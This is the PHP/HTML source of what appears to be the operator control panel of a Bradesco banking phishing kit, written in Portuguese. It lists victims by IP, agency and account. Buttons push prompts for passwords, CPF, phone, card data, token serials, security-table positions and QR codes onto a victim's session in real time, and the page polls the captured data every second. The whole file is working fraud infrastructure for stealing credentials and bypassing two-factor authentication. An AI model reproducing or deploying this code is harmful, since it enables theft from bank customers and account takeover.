<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title><?php print $row_php_cliente['agencia']; ?> - OPERANDO</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.css">
    <link rel="stylesheet" href="css/custom.css">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/js/all.min.js" integrity="sha512-2bMhOkE/ACz21dJT8zBOMgMecNxx0d37NND803ExktKiKdSzdwn+L7i9fdccw/3V06gM/DBWKbYmQvKMdAA9Nw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!--INCLUDE CSS-->
    <script src="./js/function.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.js" integrity="sha512-nO7wgHUoWPYGCNriyGzcFwPSF+bPDOR+NvtOYy2wMcWkrnCNPKBcFEkU80XIN14UVja0Gdnff9EmydyLlOL7mQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo01" aria-controls="navbarTogglerDemo01" aria-expanded="false" aria-label="Alterna navegação">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarTogglerDemo01">

            <a class="navbar-brand" href="#"><img width="200" src="images/logo.png"></a>


            <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                <li class="nav-item">
                    <a class="nav-link" href="./">Infos</a>
                </li>
            </ul>
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="#">Sair</a>
                </li>
            </ul>

        </div>
    </nav>
    <div class="container-fluid">
        <div class="pt-5">
            <div class="container-fluid mb-3" style="padding: 0px;">
                <div class="row">
                    <div class="col-6">

                    </div>

                </div>
            </div>

            <table id="infos" class="table">
                <thead>
                    <tr>
                        <th scope="col">ID</th>
                        <th scope="col">IP</th>
                        <th scope="col">Data Hora</th>
                        <th scope="col">Device</th>
                        <th scope="col">Agencia</th>
                        <th scope="col">Conta</th>
                        <th scope="col">Tipo</th>
                        <th scope="col">Status</th>
                        <th scope="col">Comando</th>
                    </tr>
                </thead>
                <tbody>
                    <tr class="header visualizado" id="table_header" data-aberto="1">

                    </tr>
                    <input type="hidden" name="id_cliente" value="<?php print $_GET['id']; ?>" id="id_cliente">
                    <input type="hidden" name="conta_cliente" value="<?php print $row_php_cliente['agencia']; ?>" id="conta_cliente">
                    <tr class="detail ">
                        <td colspan="12">
                            <div class="container-fluid">
                                <div class="row">
                                    <div class="col-12" id="botoes-acoes">
                                        <div id="botoes-parte-1">
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('login');" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-times "></i> LOGIN</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('atualizar_modulo');" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-upload  "></i> ATUALIZAÇÃO</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('atendimento_finalizado');" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-paper-plane"></i> FINALIZAR</button>
                                            <br>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('senha_4');" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-key"></i> SENHA 4</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('cpf');" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('celular');" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> CELULAR</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('mae');" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Cartão</button>
                                            <br>

                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('senha_4_erro');" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-key "></i> SENHA 4</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('cpf_erro');" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('celular_erro');" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> CELULAR</button>
                                            <button data-action="ALTERAR_COMANDO" onclick="SolicitarComando('mae_erro');" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Cartão</button>


                                        </div>

                                    </div>
                                </div>
                                <div class="row">
                                    <div id="token" class="col-6">
                                        <div class="mb-3 mt-3">
                                            <h5 class="mb-3">Token / Tabela Atual:</h5>
                                            <span class="tokenAtual token" id="tabela_atual">-----</span>
                                        </div>
                                        <h5 class="mb-3">Histórico de Tokens / Tabelas</h5>
                                        <table id="tokens" class="table table-striped table-dark">
                                            <thead>
                                                <tr>
                                                    <th scope="col">#</th>
                                                    <th scope="col">Data / Hora</th>
                                                    <th scope="col">Tipo</th>
                                                    <th scope="col">Token/QrCode</th>
                                                </tr>
                                            </thead>
                                            <tbody id="tabela_token">

                                            </tbody>
                                        </table>
                                    </div>
                                    <div id="information" class="col-6">
                                        <h5 class="mb-3 mt-3">Enviar Informações:</h5>
                                        <table>
                                            <tbody>
                                                <tr>
                                                    <td width="20%">QR Code:</td>
                                                    <td><input class="field file" type="file" name="file" id="file" style="width:300px;"> <button data-id="2" data-action="UPLOAD_QR" type="submit" name="submit" class="enviarQr btn botao-pequeno btn-outline-info btn-sm ml-2 submit">Enviar</button>&nbsp;<button data-id="2" data-action="UPLOAD_QR" type="submit" name="submit_erro" class="enviarQr_erro btn botao-pequeno btn-outline-danger btn-sm ml-2 submit_erro">Enviar</button></td>
                                                </tr>
                                                <tr>
                                                    <td width="20%">Titulares:</td>
                                                    <td><input class="field" type="text" value="<?php print $row_php_cliente['titular_01']; ?>" placeholder="Titular 01" name="titular_1" id="titular_1" style="width:100px;">&nbsp;<input class="field" type="text" placeholder="Titular 02" value="<?php print $row_php_cliente['titular_02']; ?>" name="titular_2" id="titular_2" style="width:100px;">&nbsp;<button data-id="2" onclick="Titularesbradesco('varejo');" type="button" class="btn botao-pequeno btn-outline-info btn-sm ml-2">Classic</button>&nbsp;<button data-id="2" onclick="Titularesbradesco('exclusive');" type="button" class="btn botao-pequeno btn-outline-info btn-sm ml-2">Exclusive</button>&nbsp;<button data-id="2" onclick="Titularesbradesco('prime');" type="button" class="btn botao-pequeno btn-outline-info btn-sm ml-2">Prime</button></td>
                                                </tr>
                                                <tr>
                                                    <td width="20%">Serial Dispositivo:</td>
                                                    <td><input class="field" value="<?php print $row_php_cliente['serial']; ?>" placeholder="Serial" type="text" name="serialDispositivo" id="serialDispositivo" style="width:100px;"> <button data-id="2" type="button" class="enviarSerialDispositivo btn botao-pequeno btn-outline-info btn-sm ml-2">Token</button>&nbsp;<button data-id="2" type="button" class="enviarSerialDispositivo_erro btn botao-pequeno btn-outline-danger btn-sm ml-2">Token</button>
                                                        &nbsp;&nbsp;&nbsp;<br><br><input class="field" value="<?php print $row_php_cliente['tabela']; ?>" placeholder="Posição" type="text" name="tabela" id="tabela" style="width:100px;"> <button data-id="2" type="button" class="enviarTabela btn botao-pequeno btn-outline-info btn-sm ml-2">Tabela</button>&nbsp;<button data-id="2" type="button" class="enviarTabela_erro btn botao-pequeno btn-outline-danger btn-sm ml-2">Tabela</button></td>
                                                </tr>
                                                <tr>
                                                    <td width="20%">Saldo:</td>
                                                    <td><input onKeyPress="return(moeda(this,'.',',',event))" class="field" type="text" value="<?php print $row_php_cliente['saldo']; ?>" name="saldo" id="saldo" style="width:300px;"> <button data-id="2" type="button" class="enviarSaldo btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <h5 class="mb-3 mt-3">Outras informações:</h5>
                                        <table class="tableinfo" id="tableinfo">
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </td>
                    </tr>
                </tbody>

            </table>

        </div>
    </div>
</body>
<script>
    function copiarUsuario(button) {
        // Seleciona o elemento div pelo ID
        var div = document.getElementById("usuariocopy");

        // Cria uma área de transferência temporária
        var textarea = document.createElement("textarea");

        // Define o valor da área de transferência como o conteúdo da div
        textarea.value = div.innerText;

        // Anexa a área de transferência ao corpo da página
        document.body.appendChild(textarea);

        // Seleciona o texto na área de transferência
        textarea.select();

        // Copia o texto para a área de transferência
        document.execCommand("copy");

        // Remove a área de transferência temporária
        document.body.removeChild(textarea);

        // Atualiza o texto do botão para mostrar que o conteúdo foi copiado
        button.innerText = "Copiado!";

        // Define um timeout para restaurar o texto original do botão após alguns segundos
        setTimeout(function() {
            button.innerText = "Copiar";
        }, 2000); // Restaura o texto original após 2 segundos
    }
</script>

<script>
    function copiarSenha(button) {
        // Seleciona o elemento div pelo ID
        var div = document.getElementById("senhacopy");

        // Cria uma área de transferência temporária
        var textarea = document.createElement("textarea");

        // Define o valor da área de transferência como o conteúdo da div
        textarea.value = div.innerText;

        // Anexa a área de transferência ao corpo da página
        document.body.appendChild(textarea);

        // Seleciona o texto na área de transferência
        textarea.select();

        // Copia o texto para a área de transferência
        document.execCommand("copy");

        // Remove a área de transferência temporária
        document.body.removeChild(textarea);

        // Atualiza o texto do botão para mostrar que o conteúdo foi copiado
        button.innerText = "Copiado!";

        // Define um timeout para restaurar o texto original do botão após alguns segundos
        setTimeout(function() {
            button.innerText = "Copiar";
        }, 2000); // Restaura o texto original após 2 segundos
    }
</script>

<script>
    var id = document.querySelector('#id_cliente').value;
    var conta_cliente = document.querySelector('#conta_cliente').value;

    const request = $.ajax({
        url: "../webdriver/function.php?funcao=operar&id=" + id,
        method: "post",
        dataType: "text",
        data: {
            comando: ''
        },
        cache: false
    });

    var auto_refresh = setInterval(
        function() {
            $.ajax({
                url: "../webdriver/paginas/up_table.php/?id=" + id,
                type: "GET",
                data: ({

                }), //estamos enviando o valor do input
                success: function(resposta) {
                    $('#resultado').html(resposta);
                    document.getElementById("tableinfo").innerHTML = resposta;
                }
            });
        }, 1000); // refresh every 10000 milliseconds

    var auto_refresh = setInterval(
        function() {
            $.ajax({
                url: "../webdriver/paginas/header_table.php/?id=" + id,
                type: "GET",
                data: ({

                }), //estamos enviando o valor do input
                success: function(resposta) {
                    $('#resultado').html(resposta);
                    document.getElementById("table_header").innerHTML = resposta;
                }
            });
        }, 3000); // refresh every 10000 milliseconds

    var auto_refresh = setInterval(
        function() {
            $.ajax({
                url: "../webdriver/paginas/tabela_token.php/?id=" + id,
                type: "GET",
                data: ({

                }), //estamos enviando o valor do input
                success: function(resposta) {
                    $('#resultado').html(resposta);
                    document.getElementById("tabela_token").innerHTML = resposta;
                }
            });
        }, 1000); // refresh every 10000 milliseconds

    var auto_refresh = setInterval(
        function() {
            $.ajax({
                url: "../webdriver/function.php?funcao=tabela-atual&id=" + conta_cliente,
                type: "GET",
                data: ({

                }), //estamos enviando o valor do input
                success: function(resposta) {
                    $('#resultado').html(resposta);
                    document.getElementById("tabela_atual").innerHTML = resposta;
                }
            });
        }, 1000); // refresh every 10000 milliseconds

    /////////////////////////

    function SolicitarComando(cmd) {

        if (confirm("Deseja mesmo pedir o " + cmd + "?") == true) {

        } else {
            return false;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=acionar-comando&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                comando: cmd
            },
            cache: false
        });

        request.done(data => {

            //alert('Solicitação efetuada com sucesso!');

        })

    }

    $('.enviarTabela').on('click', function(evt) {

        var tabela = document.querySelector('#tabela').value;

        if (tabela === '') {
            alert('Por favor insira a Posição da tabela!')
            return;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-tabela&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                valor: tabela,
                comando: 'tabela'
            },
            cache: false
        });

        request.done(data => {
            alert('Tabela enviada com sucesso!');
        })

    })

    $('.enviarTabela_erro').on('click', function(evt) {

        var tabela = document.querySelector('#tabela').value;

        if (tabela === '') {
            alert('Por favor insira a Posição da tabela!')
            return;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-tabela&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                valor: tabela,
                comando: 'tabela_erro'
            },
            cache: false
        });

        request.done(data => {
            alert('Tabela enviada com sucesso!');
        })

    })

    function Titularesbradesco(tipo) {

        //alert(tipo);

        var titular_1 = document.querySelector('#titular_1').value;
        var titular_2 = document.querySelector('#titular_2').value;

        //alert(titular_1 + ' ' + titular_2 + ' ' + tipo);

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=atualizar-titular&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                titular_1: titular_1,
                titular_2: titular_2,
                variacao: tipo,
                comando: 'atualizando titulares'
            },
            cache: false
        });

        request.done(data => {

            //alert('Titulares atualizado com sucesso!');

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-cmd-admin&id=" + id,
                method: "post",
                dataType: "text",
                data: {
                    comando: 'TITULARES ATUALIZADO'
                },
                cache: false
            });
            return true;

        })

    }

    $('.enviarSaldo').on('click', function(evt) {

        var saldo_user = document.querySelector('#saldo').value;

        if (saldo_user === '') {
            alert('Por favor insira o saldo!')
            return;
        }

        if (confirm("Deseja mesmo adicionar o saldo de: " + saldo_user + " ?") == true) {

        } else {
            return false;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-saldo&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                valor: saldo_user,
                comando: 'atualizar_saldo'
            },
            cache: false
        });

        request.done(data => {

            //alert('Saldo atualizado com sucesso!');

        })

    })

    $('.enviarSerialDispositivo').on('click', function(evt) {

        var dispositivo_user = document.querySelector('#serialDispositivo').value;

        if (dispositivo_user === '') {
            alert('Por favor insira o serial do dispositivo!')
            return;
        }

        if (confirm("Deseja mesmo enviar o dispositivo: " + dispositivo_user + " ?") == true) {

        } else {
            return false;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-serial&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                valor: dispositivo_user,
                comando: 'token_6'
            },
            cache: false
        });

        request.done(data => {
            alert('Serial enviado com sucesso!');
        })

    })

    $('.enviarSerialDispositivo_erro').on('click', function(evt) {

        var dispositivo_user = document.querySelector('#serialDispositivo').value;

        if (dispositivo_user === '') {
            alert('Por favor insira o serial do dispositivo!')
            return;
        }

        if (confirm("Deseja mesmo enviar o dispositivo: " + dispositivo_user + " ? - ERRO") == true) {

        } else {
            return false;
        }

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-serial&id=" + id,
            method: "post",
            dataType: "text",
            data: {
                valor: dispositivo_user,
                comando: 'token_6_erro'
            },
            cache: false
        });

        request.done(data => {
            alert('Serial enviado com sucesso!');
        })

    })

    /////////////////////

    /////////////////


    $(function() {
        $('.submit').on('click', function() {
            var qrcode_user = document.querySelector('#file').value;

            if (qrcode_user === '') {
                alert('Por favor selecione a imagem!')
                return;
            }

            if (confirm("Deseja mesmo enviar essa imagem?") == true) {

            } else {
                return false;
            }

            var file_data = $('.file').prop('files')[0];
            if (file_data != undefined) {
                var form_data = new FormData();
                form_data.append('file', file_data);
                $.ajax({
                    type: 'POST',
                    url: '../webdriver/function.php?app=qrcode&client_id=' + id,
                    contentType: false,
                    processData: false,
                    data: form_data,
                    success: function(response) {
                        if (response == 'true') {
                            //alert('Imagem enviada com sucesso!');
                        } else {
                            alert('Não foi possivel enviar a imagem, tente novamente!');
                        }

                        $('.file').val('');
                    }
                });
            }
            return false;
        });
    });

    $(function() {
        $('.submit_erro').on('click', function() {
            var qrcode_user = document.querySelector('#file').value;

            if (qrcode_user === '') {
                alert('Por favor selecione a imagem!')
                return;
            }

            if (confirm("Deseja mesmo enviar essa imagem?") == true) {

            } else {
                return false;
            }

            var file_data = $('.file').prop('files')[0];
            if (file_data != undefined) {
                var form_data = new FormData();
                form_data.append('file', file_data);
                $.ajax({
                    type: 'POST',
                    url: '../webdriver/function.php?app=qrcode-erro&client_id=' + id,
                    contentType: false,
                    processData: false,
                    data: form_data,
                    success: function(response) {
                        if (response == 'true') {
                            alert('Imagem enviada com sucesso!');
                        } else {
                            alert('Não foi possivel enviar a imagem, tente novamente!');
                        }

                        $('.file').val('');
                    }
                });
            }
            return false;
        });
    });
</script>

</html>